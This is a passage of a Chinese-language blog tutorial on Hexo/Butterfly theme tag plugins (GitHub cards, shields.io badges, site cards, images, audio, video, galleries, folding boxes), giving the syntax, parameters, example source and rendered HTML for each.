noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=solarized-light&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=onedark&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=solarized-dark&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=algolia&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=calm&show_owner=true"/></a></td></tr></tbody></table><p>2.仓库信息卡片</p><table><thead><tr><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&show_owner=true"/></a></th><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=vue&show_owner=true"/></a></th></tr></thead><tbody><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=buefy&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=solarized-light&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=onedark&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=solarized-dark&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=algolia&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=calm&show_owner=true"/></a></td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="github徽标-ghbdage">github徽标 ghbdage</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage [right],[left],[logo]||[color],[link],[title]||[option] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>left</code>：徽标左边的信息，必选参数。</li><li><code>right</code>: 徽标右边的信息，必选参数，</li><li><code>logo</code>：徽标图标，图标名称详见<a href="https://simpleicons.org/">simpleicons</a>，可选参数。</li><li><code>color</code>：徽标右边的颜色，可选参数。</li><li><code>link</code>：指向的链接，可选参数。</li><li><code>title</code>：徽标的额外信息，可选参数。主要用于优化SEO，但 <code>object</code>标签不会像 <code>a</code>标签一样在鼠标悬停显示 <code>title</code>信息。</li><li><code>option</code>：自定义参数，支持<a href="https://shields.io/">shields.io</a>的全部API参数支持，具体参数可以参看上文中的拓展写法示例。形式为 <code>name1=value2&amp;name2=value2</code>。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.基本参数,定义徽标左右文字和图标</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage Theme,Butterfly %&#125;</span><br><span class="line">&#123;% bdage Frame,Hexo,hexo %&#125;</span><br></pre></td></tr></table></figure><p>2.信息参数，定义徽标右侧内容背景色，指向链接</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage CDN,JsDelivr,jsDelivr||abcdef,https://metroui.org.ua/index.html,本站使用JsDelivr为静态资源提供CDN加速 %&#125;</span><br><span class="line">//如果是跨顺序省略可选参数，仍然需要写个逗号,用作分割</span><br><span class="line">&#123;% bdage Source,GitHub,GitHub||,https://github.com/ %&#125;</span><br></pre></td></tr></table></figure><p>3.拓展参数，支持shields的API的全部参数内容</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage Hosted,Vercel,Vercel||brightgreen,https://vercel.com/,本站采用双线部署，默认线路托管于Vercel||style=social&amp;logoWidth=20 %&#125;</span><br><span class="line">//如果是跨顺序省略可选参数组，仍然需要写双竖线||用作分割</span><br><span class="line">&#123;% bdage Hosted,Vercel,Vercel||||style=social&amp;logoWidth=20&amp;logoColor=violet %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.基本参数,定义徽标左右文字和图标</p><p><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/Butterfly-Theme-orange?logo=&color=orange&link=&"></object><br><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/Hexo-Frame-orange?logo=hexo&color=orange&link=&"></object></p><p>2.信息参数，定义徽标右侧内容背景色，指向链接</p><p><object class="ghbdage" style="margin-inline:5px" title="本站使用JsDelivr为静态资源提供CDN加速" standby="loading..." data="https://img.shields.io/badge/JsDelivr-CDN-orange?logo=jsDelivr&color=abcdef&link=https://metroui.org.ua/index.html&"></object><br>//如果是跨顺序省略可选参数，仍然需要写个逗号,用作分割<br><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/GitHub-Source-orange?logo=GitHub&color=orange&link=https://github.com/&"></object></p><p>3.拓展参数，支持shields的API的全部参数内容</p><p><object class="ghbdage" style="margin-inline:5px" title="本站采用双线部署，默认线路托管于Vercel" standby="loading..." data="https://img.shields.io/badge/Vercel-Hosted-orange?logo=Vercel&color=brightgreen&link=https://vercel.com/&style=social&logoWidth=20"></object><br>//如果是跨顺序省略可选参数组，仍然需要写双竖线||用作分割<br><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/Vercel-Hosted-orange?logo=Vercel&color=orange&link=&style=social&logoWidth=20&logoColor=violet"></object></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="网站卡片-sites">网站卡片 sites</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% sitegroup %&#125;</span><br><span class="line">&#123;% site 标题, url=链接, screenshot=截图链接, avatar=头像链接（可选）, description=描述（可选） %&#125;</span><br><span class="line">&#123;% site 标题, url=链接, screenshot=截图链接, avatar=头像链接（可选）, description=描述（可选） %&#125;</span><br><span class="line">&#123;% endsitegroup %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% sitegroup %&#125;</span><br><span class="line">&#123;% site 百度, url=https://www.baidu.com, screenshot=https://image.thum.io/get/allowJPG/wait/20/width/600/crop/950/https://www.baidu.com, avatar=https://www.baidu.com/favicon.ico, description=百度 %&#125;</span><br><span class="line">&#123;% endsitegroup %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><div class="site-card-group"><a class="site-card" href="https://www.baidu.com"><div class="img"><img src="https://image.thum.io/get/allowJPG/wait/20/width/600/crop/950/https://www.baidu.com"/></div><div class="info"><img src="https://www.baidu.com/favicon.ico"/><span class="title">百度</span><span class="desc">百度</span></div></a></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="行内图片-inlineimage">行内图片 inlineimage</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% inlineimage 图片链接, height=高度（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>高度</code>：height=20px</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这是 &#123;% inlineimage https://fastly.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0000.gif %&#125; 一段话。</span><br><span class="line"></span><br><span class="line">这又是 &#123;% inlineimage https://fastly.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/5150.gif, height=40px %&#125; 一段话。</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>这是 <img no-lazy class="inline" src="https://fastly.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0000.gif" style="height:1.5em"/> 一段话。</p><p>这又是 <img no-lazy class="inline" src="https://fastly.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/5150.gif" style="height:40px;"/> 一段话。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="单张图片-image">单张图片 image</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image 链接, width=宽度（可选）, height=高度（可选）, alt=描述（可选）, bg=占位颜色（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li>图片宽度高度：width=300px, height=32px</li><li>图片描述：alt=图片描述（butterfly需要在主题配置文件中开启图片描述）</li><li>占位背景色：bg=#f2f2f2</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.添加描述：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://fastly.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, alt=每天下课回宿舍的路，没有什么故事。 %&#125;</span><br></pre></td></tr></table></figure><p>2.指定宽度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://fastly.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px %&#125;</span><br></pre></td></tr></table></figure><p>3.指定宽度并添加描述：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://fastly.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px, alt=每天下课回宿舍的路，没有什么故事。 %&#125;</span><br></pre></td></tr></table></figure><p>4.设置占位背景色：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://fastly.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px, bg=#1D0C04, alt=优化不同宽度浏览的观感 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.添加描述：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://fastly.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" alt="每天下课回宿舍的路，没有什么故事。"/></div><span class="image-caption">每天下课回宿舍的路，没有什么故事。</span></div>2..指定宽度<div class="img-wrap"><div class="img-bg"><img class="img" src="https://fastly.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" style="width:400px;"/></div></div>3.指定宽度并添加描述：<div class="img-wrap"><div class="img-bg"><img class="img" src="https://fastly.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" alt="每天下课回宿舍的路，没有什么故事。" style="width:400px;"/></div><span class="image-caption">每天下课回宿舍的路，没有什么故事。</span></div>4.设置占位背景色：<div class="img-wrap"><div class="img-bg" style="background:#1D0C04"><img class="img" src="https://fastly.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" alt="优化不同宽度浏览的观感" style="width:400px;"/></div><span class="image-caption">优化不同宽度浏览的观感</span></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="音频-audio">音频 audio</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% audio 音频链接 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% audio https://github.com/volantis-x/volantis-docs/releases/download/assets/Lumia1020.mp3 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><div class="audio"><audio controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/Lumia1020.mp3' type='audio/mp3'>Your browser does not support the audio tag.</audio></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="视频-video">视频 video</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% video 视频链接 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>对齐方向</code>：left, center, right</li><li><code>列数</code>：逗号后面直接写列数，支持 1 ～ 4 列。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.100%宽度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br></pre></td></tr></table></figure><p>2.50%宽度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% videos, 2 %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% endvideos %&#125;</span><br></pre></td></tr></table></figure><p>3.25%宽度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% videos, 4 %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% endvideos %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.100%宽度</p><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div>2.50%宽度<div class="videos" col='2'><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div></div>3.25%宽度<div class="videos" col='4'><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="相册-gallery">相册 gallery</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><p>1.gallerygroup 相册图库</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;gallery-group-main&quot;</span>&gt;</span></span></span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>2.gallery 相册</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">markdown 圖片格式</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ul><li>gallerygroup 相册图库</li></ul><table><thead><tr><th>参数名</th><th>释义</th></tr></thead><tbody><tr><td>name</td><td>图库名字</td></tr><tr><td>description</td><td>图库描述</td></tr><tr><td>link</td><td>链接到对应相册的地址</td></tr><tr><td>img-url</td><td>图库封面</td></tr></tbody></table><ul><li><p>gallery 相册</p><p>区别于旧版的Gallery相册,新的Gallery相册会自动根据图片长度进行排版，书写也更加方便，与markdown格式一样。可根据需要插入到相应的md。无需再自己配置长宽。<strong>建议在粘贴时故意使用长短、大小、横竖不一的图片</strong>，会有更好的效果。（尺寸完全相同的图片只会平铺输出，效果很糟糕）</p></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.gallerygroup 相册图库</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;gallery-group-main&quot;</span>&gt;</span></span></span><br><span class="line">&#123;% galleryGroup MC 在Rikkaの六花服务器里留下的足迹 &#x27;/gallery/MC/&#x27; https://cdn.cbd.int/akilar-candyassets@1.0.36/image/1.jpg %&#125;</span><br><span class="line">&#123;% galleryGroup Gundam 哦咧哇gundam哒！ &#x27;/gallery/Gundam/&#x27; https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907110508327.png %&#125;</span><br><span class="line">&#123;% galleryGroup I-am-Akilar 某种意义上也算自拍吧 &#x27;/gallery/I-am-Akilar/&#x27; https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907113116651.png %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>2.gallery 相册</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg</span>)</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg</span>)</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.gallerygroup 相册图库</p><div class="gallery-group-main">  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://cdn.cbd.int/akilar-candyassets@1.0.36/image/1.jpg' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">MC</div>  <p>在Rikkaの六花服务器里留下的足迹</p>  <a href='/gallery/MC/'></a>  </figcaption>  </figure>  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907110508327.png' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">Gundam</div>  <p>哦咧哇gundam哒！</p>  <a href='/gallery/Gundam/'></a>  </figcaption>  </figure>  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907113116651.png' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">I-am-Akilar</div>  <p>某种意义上也算自拍吧</p>  <a href='/gallery/I-am-Akilar/'></a>  </figcaption>  </figure></div>2.gallery 相册<div class="gallery">    <div class="fj-gallery  data" data-rowHeight="220" data-limit="10">    <span class="gallery-data">[{"url":"https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg","alt":""},{"url":"https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg","alt":""}]</span>    </div>    <button class="gallery-load-more"><span>加载更多</span><i class="fa-solid fa-arrow-down"></i></button>    </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="折叠框-folding">折叠框 folding</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><p>1.gallerygroup 相册图库</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% folding 参数（可选）, 标题 %&#125;</span><br><span class="line">![](<span class="link">https://fastly.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg</span>)</span><br><span class="line">&#123;% endfolding %&#125;</span><br></pre></td></tr></table></figure><!-- tab 参数配置 --><ol><li><code>颜色</code>：blue, cyan, green, yellow, 